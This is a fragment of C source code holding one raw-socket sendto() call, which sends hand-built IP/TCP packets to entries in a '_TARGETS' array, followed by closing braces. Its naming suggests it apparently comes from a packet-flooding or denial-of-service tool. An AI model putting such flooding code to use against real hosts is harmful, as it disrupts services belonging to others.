            sendto(GET_RECV_DESCRIPTOR, GET_TCP_STATE_PACKET, sizeof(struct iphdr) + sizeof(struct tcphdr) + DATA_LENGHT, MSG_NOSIGNAL, (struct sockaddr *)&_TARGETS[GET_LOCAL_COUNTER]._SOCK_ADDRESS, sizeof(struct sockaddr_in));
        }
    }
}
